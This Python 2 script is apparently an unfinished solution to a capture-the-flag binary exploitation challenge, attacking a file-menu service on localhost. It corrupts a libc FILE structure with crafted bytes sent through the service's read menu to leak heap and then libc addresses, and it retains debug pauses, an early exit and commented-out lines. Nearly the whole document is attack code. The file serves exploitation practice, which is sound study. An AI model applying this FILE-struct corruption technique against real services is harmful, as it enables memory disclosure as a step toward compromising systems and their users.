from pwnlib import *
import time


s = None

def eat_banner():
	s.ru('Your choice: ')

def open(filename):
	#print 'Opening ', filename
	s.send('1\n')
	s.ru('Filename :')
	s.send('%s\n' % filename)
	eat_banner()

def read(fd, size, content=None):
	#print 'Reading file %d (%d)' % (fd, size)
	s.send('2\n')
	s.ru('Fileindex :')
	s.send('%d\n' % fd)
	s.ru('Size :')
	s.send('%d\n' % size)

	if content is not None:
		#print "Writing something with len %x" %len(content)
		s.send(content)
		time.sleep(.2)
		s.send('\x04')
	eat_banner()

def write(fd):
	#print 'Writing file %d' % fd
	s.send('3\n')
	s.ru('Fileindex :')
	s.send('%d\n' % fd)
	s.ru('\n')
	content = s.ru('Done')[:-4]
	eat_banner()
	return content

def close(fd):
	#print 'Writing file %d' % fd
	s.send('4\n')
	s.ru('Fileindex :')
	s.send('%d\n' % fd)
	eat_banner()

def main():
	#context.log_level = 'debug'
	global s
	j = 0
	while True:
		j += 1
		s = Socket(('localhost', 1710))
		eat_banner()

		leak = ''
		open('/dev/stdin')

		# leak heap
		for i in range(0,8):
			open('/bin/which')
			pl1 = 'A'*(16) #remove \n
			pl1 += pq(0x00)
			pl1 += pq(0x231)
			pl1 += pq(0x00000000fbad2488)
			pl1 += chr(0xb0+i)
			read(0, len(pl1), pl1)

			try:
				read(1,1)
			except:
				s.close()
				break
			leak += write(1)

			# TODO is this OK?
			#if leak == "":
			#	break

			close(1)
			#s.interactive()
			#embed()
		if leak == '':
			print 'Attempt %d failed' % j
			continue
		break
	heap_leak = u64(leak)
	heap_base = heap_leak - heap_leak % 0x10000
	print "leaked %#x" % heap_base


	exit()

	# leak libc
	leak = ''
	for i in range(0,8):
		open('/bin/which')
	# overwrite IO_read_ptr for file struct of /bin/which
		pl1 = 'A'*(16) #remove \n
		pl1 += p64(0x00)
		pl1 += p64(0x231)
		pl1 += p64(0x00000000fbad2488)
		pl1 += p64(heap_leak +	0x790 +i)[:-1]
		#pl1 += p64(heap_leak +  0x7a0 )
		#pl1 += p64(heap_leak +  0x7a0 )
		#pl1 += p64(heap_leak +  0x7a0 )
		#pl1 += p64(heap_leak +  0x7a0 )
		#pl1 += p64(heap_leak +  0x7a0 )
		#pl1 += '\n'
		read(0, len(pl1), pl1)
		raw_input('debug_me')
		read(1,1)
		leak += write(1)
		print leak
		close(1)

	libc_leak = u64(leak)
	print "libc_leak %#x" % libc_leak
	embed()



if __name__ == '__main__':
	main()

